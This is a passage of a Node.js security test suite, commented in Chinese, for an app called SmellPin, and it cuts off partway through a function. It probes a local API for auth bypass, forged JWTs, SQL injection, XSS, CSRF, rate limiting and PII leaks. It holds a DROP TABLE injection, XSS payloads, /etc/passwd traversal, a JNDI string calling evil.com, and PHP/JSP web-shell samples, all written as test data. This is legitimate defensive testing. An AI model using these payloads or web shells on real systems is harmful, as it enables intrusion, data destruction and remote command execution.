#!/usr/bin/env node

/**
 * SmellPin 安全测试套件
 * 
 * 包含以下测试：
 * 1. 身份验证和授权安全测试
 * 2. 数据传输安全测试
 * 3. 输入验证和SQL注入防护测试
 * 4. XSS和CSRF攻击防护测试
 * 5. API安全测试
 * 6. 用户数据隐私保护测试
 */

const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs').promises;
const jwt = require('jsonwebtoken');
const colors = require('colors');

// 测试配置
const TEST_CONFIG = {
  baseURL: process.env.API_BASE_URL || 'http://localhost:3002',
  frontendURL: process.env.FRONTEND_URL || 'http://localhost:3000',
  timeout: 10000,
  testUser: {
    username: 'security_tester_' + Math.random().toString(36).substring(7),
    email: 'security_test_' + Date.now() + '@example.com',
    password: 'TestPassword123!'
  },
  adminUser: {
    username: 'admin_test',
    email: 'admin@example.com',
    password: 'AdminPassword123!'
  }
};

// 测试结果存储
const SECURITY_REPORT = {
  vulnerabilities: [],
  warnings: [],
  passed: [],
  metadata: {
    startTime: new Date(),
    testConfig: TEST_CONFIG
  }
};

// 风险等级
const RISK_LEVELS = {
  CRITICAL: { level: 'CRITICAL', color: 'red', score: 10 },
  HIGH: { level: 'HIGH', color: 'magenta', score: 8 },
  MEDIUM: { level: 'MEDIUM', color: 'yellow', score: 5 },
  LOW: { level: 'LOW', color: 'blue', score: 3 },
  INFO: { level: 'INFO', color: 'cyan', score: 1 }
};

// HTTP客户端配置
const httpClient = axios.create({
  baseURL: TEST_CONFIG.baseURL,
  timeout: TEST_CONFIG.timeout,
  validateStatus: () => true // 不抛出HTTP错误状态的异常
});

/**
 * 记录安全问题
 */
function logSecurityIssue(type, title, description, riskLevel, evidence = null, recommendation = null) {
  const issue = {
    type,
    title,
    description,
    riskLevel,
    evidence,
    recommendation,
    timestamp: new Date(),
    testId: crypto.randomUUID()
  };

  if (riskLevel.score >= 5) {
    SECURITY_REPORT.vulnerabilities.push(issue);
    console.log(colors[riskLevel.color](`🚨 [${riskLevel.level}] ${title}`));
  } else if (riskLevel.score >= 3) {
    SECURITY_REPORT.warnings.push(issue);
    console.log(colors[riskLevel.color](`⚠️  [${riskLevel.level}] ${title}`));
  } else {
    SECURITY_REPORT.passed.push(issue);
    console.log(colors.green(`✅ ${title}`));
  }
}

/**
 * 1. 身份验证和授权安全测试
 */
async function testAuthenticationSecurity() {
  console.log('\n🔐 开始身份验证和授权安全测试...\n');

  try {
    // 测试1: 检查JWT密钥强度
    const jwtSecret = process.env.JWT_SECRET || 'smellpin_mvp_secret_2025';
    if (jwtSecret.length < 32) {
      logSecurityIssue(
        'AUTH',
        'JWT密钥强度不足',
        `JWT密钥长度为${jwtSecret.length}字符，建议至少32字符`,
        RISK_LEVELS.HIGH,
        { jwtSecretLength: jwtSecret.length },
        '使用至少32字符的强随机密钥，包含大小写字母、数字和特殊字符'
      );
    } else {
      logSecurityIssue('AUTH', 'JWT密钥强度检查通过', null, RISK_LEVELS.INFO);
    }

    // 测试2: 尝试无授权访问受保护的端点
    const protectedEndpoints = [
      '/api/annotations',
      '/api/users/profile',
      '/api/admin/users',
      '/api/wallet/balance'
    ];

    for (const endpoint of protectedEndpoints) {
      try {
        const response = await httpClient.get(endpoint);
        
        if (response.status === 200) {
          logSecurityIssue(
            'AUTH',
            '未授权访问漏洞',
            `端点 ${endpoint} 允许未授权访问`,
            RISK_LEVELS.CRITICAL,
            { endpoint, status: response.status, data: response.data },
            '为所有敏感端点添加身份验证中间件'
          );
        } else if (response.status === 401 || response.status === 403) {
          logSecurityIssue('AUTH', `受保护端点 ${endpoint} 正确拒绝未授权访问`, null, RISK_LEVELS.INFO);
        }
      } catch (error) {
        // 网络错误或服务器不可用，跳过该测试
      }
    }

    // 测试3: JWT令牌操作测试
    try {
      // 创建无效的JWT令牌
      const invalidTokens = [
        'Bearer invalid_token',
        'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.MjU5NDY4NzA2NDM4MDE2MTI1ODcxOTQ2NTU0ODQyMzM2', // 无效签名
        'Bearer ' + Buffer.from('{"alg":"none"}').toString('base64') + '.' + Buffer.from('{"sub":"admin"}').toString('base64') + '.'
      ];

      for (const token of invalidTokens) {
        const response = await httpClient.get('/api/users/profile', {
          headers: { Authorization: token }
        });

        if (response.status === 200) {
          logSecurityIssue(
            'AUTH',
            'JWT验证绕过漏洞',
            '系统接受了无效的JWT令牌',
            RISK_LEVELS.CRITICAL,
            { invalidToken: token, response: response.data },
            '加强JWT验证逻辑，确保签名验证正确'
          );
        }
      }
    } catch (error) {
      // Expected behavior
    }

    // 测试4: 用户枚举攻击
    const commonUsernames = ['admin', 'administrator', 'root', 'user', 'test'];
    for (const username of commonUsernames) {
      try {
        const response = await httpClient.post('/api/auth/login', {
          email: `${username}@example.com`,
          password: 'wrongpassword'
        });

        // 检查响应是否泄露用户存在信息
        if (response.data && response.data.message) {
          const message = response.data.message.toLowerCase();
          if (message.includes('user not found') || message.includes('用户不存在')) {
            logSecurityIssue(
              'AUTH',
              '用户枚举漏洞',
              '登录错误消息泄露用户是否存在的信息',
              RISK_LEVELS.MEDIUM,
              { username, message: response.data.message },
              '统一所有认证错误消息，不要区分用户不存在和密码错误'
            );
            break;
          }
        }
      } catch (error) {
        // Continue testing
      }
    }

    // 测试5: 会话固定攻击
    // 测试登录前后token是否变化
    try {
      const loginResponse = await httpClient.post('/api/auth/register', TEST_CONFIG.testUser);
      
      if (loginResponse.data && loginResponse.data.token) {
        const token1 = loginResponse.data.token;
        
        // 立即重新登录
        const reLoginResponse = await httpClient.post('/api/auth/login', {
          email: TEST_CONFIG.testUser.email,
          password: TEST_CONFIG.testUser.password
        });
        
        if (reLoginResponse.data && reLoginResponse.data.token) {
          const token2 = reLoginResponse.data.token;
          
          if (token1 === token2) {
            logSecurityIssue(
              'AUTH',
              '会话固定漏洞风险',
              '重新登录后使用相同的JWT令牌',
              RISK_LEVELS.MEDIUM,
              { token1, token2 },
              '每次登录都生成新的JWT令牌'
            );
          } else {
            logSecurityIssue('AUTH', '会话管理检查通过 - 每次登录生成新令牌', null, RISK_LEVELS.INFO);
          }
        }
      }
    } catch (error) {
      logSecurityIssue('AUTH', '无法测试会话管理 - 用户注册失败', error.message, RISK_LEVELS.INFO);
    }

  } catch (error) {
    console.error('身份验证测试出错:', error.message);
  }
}

/**
 * 2. 数据传输安全测试
 */
async function testDataTransmissionSecurity() {
  console.log('\n🔒 开始数据传输安全测试...\n');

  try {
    // 测试1: HTTPS重定向检查
    if (TEST_CONFIG.baseURL.startsWith('http://')) {
      logSecurityIssue(
        'TRANSMISSION',
        'HTTP协议安全风险',
        '应用使用HTTP协议传输数据，存在中间人攻击风险',
        RISK_LEVELS.HIGH,
        { currentProtocol: 'HTTP' },
        '在生产环境中强制使用HTTPS，配置SSL/TLS证书'
      );
    } else {
      logSecurityIssue('TRANSMISSION', 'HTTPS协议检查通过', null, RISK_LEVELS.INFO);
    }

    // 测试2: 安全头检查
    try {
      const response = await httpClient.get('/');
      const headers = response.headers;

      const securityHeaders = [
        { name: 'strict-transport-security', description: 'HSTS头缺失' },
        { name: 'x-content-type-options', description: 'X-Content-Type-Options头缺失' },
        { name: 'x-frame-options', description: 'X-Frame-Options头缺失' },
        { name: 'x-xss-protection', description: 'X-XSS-Protection头缺失' },
        { name: 'content-security-policy', description: 'CSP头缺失' },
        { name: 'referrer-policy', description: 'Referrer-Policy头缺失' }
      ];

      for (const header of securityHeaders) {
        if (!headers[header.name]) {
          logSecurityIssue(
            'TRANSMISSION',
            header.description,
            `缺少安全头: ${header.name}`,
            RISK_LEVELS.MEDIUM,
            { missingHeader: header.name },
            `添加 ${header.name} 安全头`
          );
        } else {
          logSecurityIssue('TRANSMISSION', `安全头 ${header.name} 存在`, null, RISK_LEVELS.INFO);
        }
      }

      // 检查是否暴露了敏感的服务器信息
      if (headers.server) {
        logSecurityIssue(
          'TRANSMISSION',
          '服务器信息泄露',
          `Server头暴露了服务器信息: ${headers.server}`,
          RISK_LEVELS.LOW,
          { serverHeader: headers.server },
          '隐藏或泛化Server头信息'
        );
      }

      if (headers['x-powered-by']) {
        logSecurityIssue(
          'TRANSMISSION',
          '技术栈信息泄露',
          `X-Powered-By头暴露了技术栈信息: ${headers['x-powered-by']}`,
          RISK_LEVELS.LOW,
          { poweredByHeader: headers['x-powered-by'] },
          '移除X-Powered-By头'
        );
      }

    } catch (error) {
      logSecurityIssue('TRANSMISSION', '无法检查安全头 - 服务器不可达', error.message, RISK_LEVELS.INFO);
    }

    // 测试3: 敏感数据传输检查
    try {
      const loginPayload = {
        email: TEST_CONFIG.testUser.email,
        password: TEST_CONFIG.testUser.password
      };

      // 模拟网络监听，检查密码是否加密传输
      const response = await httpClient.post('/api/auth/login', loginPayload);
      
      // 在实际环境中，这里会检查网络流量是否加密
      // 由于测试限制，我们只能检查响应中是否意外返回了密码
      if (response.data && JSON.stringify(response.data).includes(TEST_CONFIG.testUser.password)) {
        logSecurityIssue(
          'TRANSMISSION',
          '密码明文返回',
          '服务器响应中包含用户密码明文',
          RISK_LEVELS.CRITICAL,
          { response: response.data },
          '确保服务器响应中永远不包含用户密码'
        );
      } else {
        logSecurityIssue('TRANSMISSION', '密码传输安全检查通过', null, RISK_LEVELS.INFO);
      }

    } catch (error) {
      // Continue testing
    }

  } catch (error) {
    console.error('数据传输安全测试出错:', error.message);
  }
}

/**
 * 3. 输入验证和SQL注入防护测试
 */
async function testInputValidationAndSQLInjection() {
  console.log('\n💉 开始输入验证和SQL注入防护测试...\n');

  try {
    // SQL注入测试载荷
    const sqlPayloads = [
      "' OR '1'='1",
      "1' UNION SELECT * FROM users--",
      "'; DROP TABLE users; --",
      "' OR 1=1 --",
      "admin'--",
      "' UNION SELECT username, password FROM users WHERE ''='",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR '1'='1' /*"
    ];

    // 测试1: 登录表单SQL注入
    for (const payload of sqlPayloads) {
      try {
        const response = await httpClient.post('/api/auth/login', {
          email: payload,
          password: payload
        });

        // 检查是否成功登录或返回了敏感信息
        if (response.status === 200 && response.data.success) {
          logSecurityIssue(
            'INJECTION',
            'SQL注入漏洞 - 登录绕过',
            `SQL注入载荷成功绕过登录验证: ${payload}`,
            RISK_LEVELS.CRITICAL,
            { payload, response: response.data },
            '使用参数化查询和输入验证'
          );
        }

        // 检查错误信息是否泄露数据库结构
        if (response.data.message && 
            (response.data.message.includes('SQL') || 
             response.data.message.includes('database') ||
             response.data.message.includes('syntax'))) {
          logSecurityIssue(
            'INJECTION',
            'SQL错误信息泄露',
            '错误信息可能泄露数据库结构信息',
            RISK_LEVELS.MEDIUM,
            { payload, errorMessage: response.data.message },
            '统一错误处理，不要在响应中暴露技术细节'
          );
        }
      } catch (error) {
        // Expected behavior for most payloads
      }
    }

    // 测试2: 搜索功能SQL注入
    const searchPayloads = sqlPayloads.concat([
      "%' UNION SELECT * FROM users WHERE ''='",
      "test%' AND (SELECT COUNT(*) FROM users) > 0 --"
    ]);

    for (const payload of searchPayloads) {
      try {
        const response = await httpClient.get('/api/annotations/search', {
          params: { q: payload }
        });

        if (response.data && response.data.annotations && response.data.annotations.length > 0) {
          // 检查是否返回了异常数量的结果
          if (response.data.annotations.length > 100) {
            logSecurityIssue(
              'INJECTION',
              'SQL注入可能 - 异常搜索结果',
              `搜索载荷返回了异常数量的结果: ${response.data.annotations.length}`,
              RISK_LEVELS.HIGH,
              { payload, resultCount: response.data.annotations.length },
              '检查搜索功能的SQL查询是否使用参数化语句'
            );
          }
        }
      } catch (error) {
        // Continue testing
      }
    }

    // 测试3: 创建标注时的输入验证
    const maliciousInputs = [
      "<script>alert('XSS')</script>",
      "javascript:alert(1)",
      "'; DROP TABLE annotations; --",
      "../../etc/passwd",
      "${jndi:ldap://evil.com/}",
      "<img src=x onerror=alert(1)>"
    ];

    for (const input of maliciousInputs) {
      try {
        const response = await httpClient.post('/api/annotations', {
          latitude: 40.7128,
          longitude: -74.0060,
          smellIntensity: 5,
          description: input
        }, {
          headers: { Authorization: 'Bearer fake_token' }
        });

        if (response.status === 201 && response.data.success) {
          logSecurityIssue(
            'VALIDATION',
            '输入验证不足',
            `恶意输入未被过滤: ${input}`,
            RISK_LEVELS.HIGH,
            { maliciousInput: input, response: response.data },
            '实施严格的输入验证和输出编码'
          );
        }
      } catch (error) {
        // Expected behavior
      }
    }

    // 测试4: 文件上传安全检查
    try {
      // 创建恶意文件内容
      const maliciousFiles = [
        { name: 'test.php', content: '<?php system($_GET[\'cmd\']); ?>' },
        { name: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'test.html', content: '<script>alert("XSS")</script>' }
      ];

      for (const file of maliciousFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content]), file.name);

        try {
          const response = await httpClient.post('/api/media/upload', formData, {
            headers: {
              'Content-Type': 'multipart/form-data',
              Authorization: 'Bearer fake_token'
            }
          });

          if (response.status === 200 && response.data.success) {
            logSecurityIssue(
              'VALIDATION',
              '恶意文件上传漏洞',
              `系统接受了恶意文件上传: ${file.name}`,
              RISK_LEVELS.CRITICAL,
              { fileName: file.name, fileContent: file.content },
              '实施文件类型验证、内容检查和安全存储'
            );
          }
        } catch (error) {
          // Expected behavior
        }
      }
    } catch (error) {
      logSecurityIssue('VALIDATION', '无法测试文件上传安全性', error.message, RISK_LEVELS.INFO);
    }

  } catch (error) {
    console.error('输入验证测试出错:', error.message);
  }
}

/**
 * 4. XSS和CSRF攻击防护测试
 */
async function testXSSAndCSRFProtection() {
  console.log('\n🕷️ 开始XSS和CSRF攻击防护测试...\n');

  try {
    // XSS测试载荷
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "\"><script>alert('XSS')</script>",
      "'><script>alert('XSS')</script>",
      "<iframe src=javascript:alert('XSS')>",
      "<body onload=alert('XSS')>",
      "<input onfocus=alert('XSS') autofocus>",
      "<<SCRIPT>alert('XSS')<</SCRIPT>"
    ];

    // 测试1: 反射型XSS
    for (const payload of xssPayloads) {
      try {
        const response = await httpClient.get('/api/search', {
          params: { q: payload }
        });

        if (response.data && typeof response.data === 'string') {
          if (response.data.includes('<script>') && !response.data.includes('&lt;script&gt;')) {
            logSecurityIssue(
              'XSS',
              '反射型XSS漏洞',
              '用户输入在响应中未经编码直接输出',
              RISK_LEVELS.HIGH,
              { payload, response: response.data },
              '对所有用户输入进行HTML编码后再输出'
            );
          }
        }
      } catch (error) {
        // Continue testing
      }
    }

    // 测试2: 存储型XSS
    try {
      // 尝试创建包含XSS的标注
      const xssAnnotation = {
        latitude: 40.7128,
        longitude: -74.0060,
        smellIntensity: 5,
        description: "<script>alert('Stored XSS')</script>"
      };

      const createResponse = await httpClient.post('/api/annotations', xssAnnotation, {
        headers: { Authorization: 'Bearer fake_token' }
      });

      if (createResponse.data && createResponse.data.success) {
        const annotationId = createResponse.data.data?.annotation?.id;
        if (annotationId) {
          // 获取创建的标注
          const getResponse = await httpClient.get(`/api/annotations/${annotationId}`);
          
          if (getResponse.data && getResponse.data.data?.annotation?.description) {
            const description = getResponse.data.data.annotation.description;
            if (description.includes('<script>') && !description.includes('&lt;script&gt;')) {
              logSecurityIssue(
                'XSS',
                '存储型XSS漏洞',
                '恶意脚本被存储在数据库中且未经编码输出',
                RISK_LEVELS.CRITICAL,
                { payload: xssAnnotation.description, storedValue: description },
                '在数据存储时过滤恶意内容，在输出时进行HTML编码'
              );
            }
          }
        }
      }
    } catch (error) {
      // Continue testing
    }

    // 测试3: CSRF保护检查
    try {
      // 尝试在没有CSRF token的情况下执行敏感操作
      const sensitiveActions = [
        { method: 'DELETE', url: '/api/annotations/1' },
        { method: 'PUT', url: '/api/users/profile' },
        { method: 'POST', url: '/api/wallet/withdraw' }
      ];

      for (const action of sensitiveActions) {
        try {
          const response = await httpClient.request({
            method: action.method,
            url: action.url,
            headers: {
              'Content-Type': 'application/json',
              // 故意不包含CSRF token
            }
          });

          // 如果操作成功执行，可能存在CSRF漏洞
          if (response.status === 200 && response.data.success) {
            logSecurityIssue(
              'CSRF',
              'CSRF保护缺失',
              `敏感操作 ${action.method} ${action.url} 缺少CSRF保护`,
              RISK_LEVELS.HIGH,
              { action, response: response.data },
              '为所有敏感操作添加CSRF token验证'
            );
          } else if (response.status === 403 && response.data.message?.includes('CSRF')) {
            logSecurityIssue('CSRF', `CSRF保护检查通过 - ${action.method} ${action.url}`, null, RISK_LEVELS.INFO);
          }
        } catch (error) {
          // Expected behavior if CSRF protection is in place
        }
      }
    } catch (error) {
      logSecurityIssue('CSRF', '无法测试CSRF保护', error.message, RISK_LEVELS.INFO);
    }

    // 测试4: Content-Type检查
    try {
      // 尝试使用错误的Content-Type发送JSON数据
      const response = await httpClient.post('/api/annotations', 
        JSON.stringify({
          latitude: 40.7128,
          longitude: -74.0060,
          smellIntensity: 5,
          description: "Test"
        }), {
          headers: {
            'Content-Type': 'text/plain', // 错误的Content-Type
            Authorization: 'Bearer fake_token'
          }
        }
      );

      if (response.status === 200 && response.data.success) {
        logSecurityIssue(
          'VALIDATION',
          'Content-Type验证缺失',
          '服务器接受了错误的Content-Type',
          RISK_LEVELS.MEDIUM,
          { expectedType: 'application/json', actualType: 'text/plain' },
          '验证请求的Content-Type是否符合预期'
        );
      }
    } catch (error) {
      // Expected behavior
    }

  } catch (error) {
    console.error('XSS和CSRF测试出错:', error.message);
  }
}

/**
 * 5. API安全测试
 */
async function testAPISecurity() {
  console.log('\n🔗 开始API安全测试...\n');

  try {
    // 测试1: API版本枚举
    const apiVersions = ['v1', 'v2', 'v3', 'api', 'rest', 'graphql'];
    for (const version of apiVersions) {
      try {
        const response = await httpClient.get(`/${version}/users`);
        if (response.status === 200) {
          logSecurityIssue(
            'API',
            'API版本枚举风险',
            `发现可访问的API版本: ${version}`,
            RISK_LEVELS.LOW,
            { version, status: response.status },
            '隐藏或限制对未使用API版本的访问'
          );
        }
      } catch (error) {
        // Continue testing
      }
    }

    // 测试2: HTTP方法枚举
    const testUrl = '/api/annotations';
    const httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE'];
    const allowedMethods = [];

    for (const method of httpMethods) {
      try {
        const response = await httpClient.request({
          method: method,
          url: testUrl
        });

        if (response.status !== 405 && response.status !== 501) {
          allowedMethods.push(method);
          
          // 检查是否意外暴露了敏感方法
          if (['TRACE', 'CONNECT'].includes(method)) {
            logSecurityIssue(
              'API',
              '危险HTTP方法暴露',
              `端点支持潜在危险的HTTP方法: ${method}`,
              RISK_LEVELS.MEDIUM,
              { method, endpoint: testUrl },
              `禁用不必要的HTTP方法，特别是 ${method}`
            );
          }
        }
      } catch (error) {
        // Continue testing
      }
    }

    if (allowedMethods.length > 0) {
      logSecurityIssue('API', `端点 ${testUrl} 支持的HTTP方法: ${allowedMethods.join(', ')}`, null, RISK_LEVELS.INFO);
    }

    // 测试3: API速率限制检查
    try {
      const requests = [];
      const testEndpoint = '/api/annotations/search?q=test';
      
      // 发送大量并发请求
      for (let i = 0; i < 50; i++) {
        requests.push(httpClient.get(testEndpoint));
      }

      const responses = await Promise.all(requests.map(req => 
        req.catch(error => ({ error: true, status: error.response?.status }))
      ));

      const rateLimitedResponses = responses.filter(resp => 
        resp.status === 429 || (resp.headers && resp.headers['x-ratelimit-limit'])
      );

      if (rateLimitedResponses.length === 0) {
        logSecurityIssue(
          'API',
          '速率限制缺失',
          'API端点未实施速率限制，可能遭受暴力攻击',
          RISK_LEVELS.MEDIUM,
          { testEndpoint, totalRequests: 50, rateLimitedRequests: 0 },
          '为所有API端点实施适当的速率限制'
        );
      } else {
        logSecurityIssue('API', '速率限制检查通过', null, RISK_LEVELS.INFO);
      }
    } catch (error) {
      logSecurityIssue('API', '无法测试速率限制', error.message, RISK_LEVELS.INFO);
    }

    // 测试4: API文档泄露检查
    const documentationPaths = [
      '/api/docs',
      '/swagger',
      '/swagger-ui',
      '/api-docs',
      '/docs',
      '/documentation',
      '/graphiql',
      '/playground'
    ];

    for (const path of documentationPaths) {
      try {
        const response = await httpClient.get(path);
        if (response.status === 200 && response.data) {
          const content = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
          if (content.includes('api') || content.includes('swagger') || content.includes('graphql')) {
            logSecurityIssue(
              'API',
              'API文档暴露风险',
              `在生产环境中暴露了API文档: ${path}`,
              RISK_LEVELS.LOW,
              { path, hasContent: true },
              '在生产环境中禁用或保护API文档访问'
            );
          }
        }
      } catch (error) {
        // Continue testing
      }
    }

    // 测试5: API错误信息泄露
    const malformedRequests = [
      { url: '/api/annotations/999999999', expected: 'user enumeration' },
      { url: '/api/users/invalid-uuid', expected: 'database error' },
      { url: '/api/annotations', method: 'POST', data: { invalid: 'json' }, expected: 'validation error' }
    ];

    for (const request of malformedRequests) {
      try {
        const response = await httpClient.request({
          method: request.method || 'GET',
          url: request.url,
          data: request.data
        });

        if (response.data && response.data.error) {
          const errorMessage = response.data.error.toLowerCase();
          // 检查是否泄露了敏感信息
          if (errorMessage.includes('stack') || 
              errorMessage.includes('database') || 
              errorMessage.includes('file') ||
              errorMessage.includes('path')) {
            logSecurityIssue(
              'API',
              'API错误信息泄露',
              '错误响应可能泄露系统内部信息',
              RISK_LEVELS.MEDIUM,
              { url: request.url, errorMessage },
              '统一错误处理，避免泄露系统内部信息'
            );
          }
        }
      } catch (error) {
        // Continue testing
      }
    }

  } catch (error) {
    console.error('API安全测试出错:', error.message);
  }
}

/**
 * 6. 用户数据隐私保护测试
 */
async function testUserDataPrivacy() {
  console.log('\n🕵️ 开始用户数据隐私保护测试...\n');

  try {
    // 测试1: 密码存储安全检查
    try {
      // 尝试注册用户并获取数据库中的密码存储方式
      const testUser = {
        username: 'privacy_test_' + Date.now(),
        email: 'privacy_' + Date.now() + '@example.com',
        password: 'TestPassword123!'
      };

      const registerResponse = await httpClient.post('/api/auth/register', testUser);
      
      // 检查响应中是否意外返回了密码
      if (registerResponse.data && JSON.stringify(registerResponse.data).includes(testUser.password)) {
        logSecurityIssue(
          'PRIVACY',
          '密码泄露在注册响应中',
          '注册响应包含了用户密码',
          RISK_LEVELS.CRITICAL,
          { testUser: { ...testUser, password: '[REDACTED]' } },
          '确保API响应中永远不包含用户密码'
        );
      }

      // 尝试获取用户信息
      if (registerResponse.data && registerResponse.data.token) {
        const profileResponse = await httpClient.get('/api/users/profile', {
          headers: { Authorization: `Bearer ${registerResponse.data.token}` }
        });

        if (profileResponse.data && profileResponse.data.data) {
          const userData = profileResponse.data.data;
          // 检查是否返回了敏感信息
          if (userData.password || userData.password_hash) {
            logSecurityIssue(
              'PRIVACY',
              '密码哈希暴露',
              '用户API返回了密码相关信息',
              RISK_LEVELS.HIGH,
              { hasPassword: !!userData.password, hasPasswordHash: !!userData.password_hash },
              '从用户API响应中移除所有密码相关字段'
            );
          } else {
            logSecurityIssue('PRIVACY', '用户密码隐私保护检查通过', null, RISK_LEVELS.INFO);
          }
        }
      }
    } catch (error) {
      logSecurityIssue('PRIVACY', '无法测试密码存储安全性', error.message, RISK_LEVELS.INFO);
    }

    // 测试2: 用户数据访问控制
    try {
      // 创建两个测试用户
      const user1 = {
        username: 'user1_' + Date.now(),
        email: 'user1_' + Date.now() + '@example.com',
        password: 'Password123!'
      };

      const user2 = {
        username: 'user2_' + Date.now(),
        email: 'user2_' + Date.now() + '@example.com',
        password: 'Password123!'
      };

      const register1 = await httpClient.post('/api/auth/register', user1);
      const register2 = await httpClient.post('/api/auth/register', user2);

      if (register1.data?.token && register2.data?.token) {
        // 尝试用user1的token访问user2的数据
        const unauthorizedAccess = await httpClient.get('/api/users/profile', {
          headers: { Authorization: `Bearer ${register1.data.token}` },
          params: { userId: register2.data.user?.id }
        });

        if (unauthorizedAccess.status === 200 && 
            unauthorizedAccess.data.data && 
            unauthorizedAccess.data.data.id !== register1.data.user?.id) {
          logSecurityIssue(
            'PRIVACY',
            '水平权限提升漏洞',
            '用户可以访问其他用户的私人数据',
            RISK_LEVELS.CRITICAL,
            { 
              attackerUserId: register1.data.user?.id, 
              victimUserId: register2.data.user?.id 
            },
            '实施严格的用户身份验证和授权检查'
          );
        } else {
          logSecurityIssue('PRIVACY', '用户数据访问控制检查通过', null, RISK_LEVELS.INFO);
        }
      }
    } catch (error) {
      logSecurityIssue('PRIVACY', '无法测试用户数据访问控制', error.message, RISK_LEVELS.INFO);
    }

    // 测试3: 个人识别信息(PII)泄露检查
    try {
      const piiPatterns = [
        { pattern: /\b\d{3}-\d{2}-\d{4}\b/, name: 'SSN', description: '社会保障号' },
        { pattern: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/, name: 'Credit Card', description: '信用卡号' },
        { pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/, name: 'Email', description: '邮箱地址' },
        { pattern: /\b\d{3}[\s.-]\d{3}[\s.-]\d{4}\b/, name: 'Phone', description: '电话号码' }
      ];

      // 检查公开的API端点是否泄露PII
      const publicEndpoints = [
        '/api/annotations',
        '/api/users/public',
        '/api/search?q=user'
      ];

      for (const endpoint of publicEndpoints) {
        try {
          const response = await httpClient.get(endpoint);
          const responseText = JSON.stringify(response.data);

          for (const pii of piiPatterns) {
            if (pii.pattern.test(responseText)) {
              logSecurityIssue(
                'PRIVACY',
                `PII泄露风险 - ${pii.description}`,
                `公开端点可能泄露个人识别信息: ${endpoint}`,
                RISK_LEVELS.HIGH,
                { endpoint, piiType: pii.name },
                `从公开API响应中移除或脱敏${pii.description}`
              );
            }
          }
        } catch (error) {
          // Continue testing
        }
      }
    } catch (error) {
      logSecurityIssue('PRIVACY', '无法测试PII泄露', error.message, RISK_LEVELS.INFO);
    }

    // 测试4: 会话管理安全性
    try {
      // 测试会话固定
      const loginResponse = await httpClient.post('/api/auth/login', {
        email: TEST_CONFIG.testUser.email,
        password: TEST_CONFIG.testUser.password
      });

      if (loginResponse.data?.token) {
        // 检查JWT payload是否包含敏感信息
        try {
          const tokenParts = loginResponse.data.token.split('.');
          if (tokenParts.length === 3) {
            const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
            
            // 检查JWT中是否包含密码、敏感个人信息等
            const sensitiveFields = ['password', 'ssn', 'credit_card', 'phone'];
            for (const field of sensitiveFields) {
              if (payload[field]) {
                logSecurityIssue(
                  'PRIVACY',
                  'JWT中包含敏感信息',
                  `JWT令牌包含敏感字段: ${field}`,
                  RISK_LEVELS.HIGH,
                  { field, payloadKeys: Object.keys(payload) },
                  '从JWT载荷中移除所有敏感个人信息'
                );
              }
            }

            // 检查过期时间是否合理
            if (payload.exp) {
              const expirationTime = payload.exp * 1000;
              const currentTime = Date.now();
              const timeDiff = expirationTime - currentTime;
              const daysDiff = timeDiff / (1000 * 60 * 60 * 24);

              if (daysDiff > 30) {
                logSecurityIssue(
                  'PRIVACY',
                  'JWT过期时间过长',
                  `JWT令牌过期时间超过30天: ${daysDiff.toFixed(1)}天`,
                  RISK_LEVELS.MEDIUM,
                  { expirationDays: daysDiff },
                  '缩短JWT令牌的有效期，建议不超过24小时'
                );
              } else {
                logSecurityIssue('PRIVACY', 'JWT过期时间设置合理', null, RISK_LEVELS.INFO);
              }
            }
          }
        } catch (decodeError) {
          logSecurityIssue('PRIVACY', 'JWT令牌格式异常', decodeError.message, RISK_LEVELS.LOW);
        }
      }
    } catch (error) {
      logSecurityIssue('PRIVACY', '无法测试会话管理', error.message, RISK_LEVELS.INFO);
    }

  } catch (error) {
    console.error('用户数据隐私测试出错:', error.message);
  }
}

/**
 * 7. 第三方服务集成安全测试
 */
async function testThirdPartyIntegrationSecurity() {
  console.log('\n🔌 开始第三方服务集成安全测试...\n');

  try {
    // 测试1: 支付系统安全检查
    try {
      // 检查PayPal配置
      const paypalClientId = process.env.PAYPAL_CLIENT_ID;
      if (paypalClientId && paypalClientId.includes('sandbox')) {
        logSecurityIssue(
          'INTEGRATION',
          '生产环境使用测试支付配置',
          'PayPal配置使用sandbox环境，可能不适用于生产',
          RISK_LEVELS.MEDIUM,
          { paypalMode: 'sandbox' },
          '在生产环境中使用正式的PayPal配置'
        );
      }

      // 尝试创建恶意支付请求
      const maliciousPayment = {
        amount: -100, // 负数金额
        currency: 'USD',
        description: '测试'
      };

      const paymentResponse = await httpClient.post('/api/payments/create', maliciousPayment, {
        headers: { Authorization: 'Bearer fake_token' }
      });

      if (paymentResponse.status === 200 && paymentResponse.data.success) {
        logSecurityIssue(
          'INTEGRATION',
          '支付金额验证不足',
          '系统接受了负数支付金额',
          RISK_LEVELS.HIGH,
          { maliciousPayment },
          '添加严格的支付金额验证'
        );
      }
    } catch (error) {
      logSecurityIssue('INTEGRATION', '无法测试支付系统安全性', error.message, RISK_LEVELS.INFO);
    }

    // 测试2: 地图API安全检查
    try {
      const mapboxToken = process.env.NEXT_PUBLIC_MAPBOX_ACCESS_TOKEN;
      if (mapboxToken && mapboxToken !== 'pk.your_mapbox_token_here') {
        logSecurityIssue(
          'INTEGRATION',
          'Mapbox token暴露风险',
          'Mapbox访问令牌可能在前端代码中暴露',
          RISK_LEVELS.LOW,
          { hasToken: !!mapboxToken },
          '确保Mapbox token有适当的域名限制和权限限制'
        );
      }

      // 测试地理编码API是否有输入验证
      const maliciousGeoInputs = [
        '../../../etc/passwd',
        '<script>alert(1)</script>',
        'javascript:alert(1)',
        '; DROP TABLE locations; --'
      ];

      for (const input of maliciousGeoInputs) {
        try {
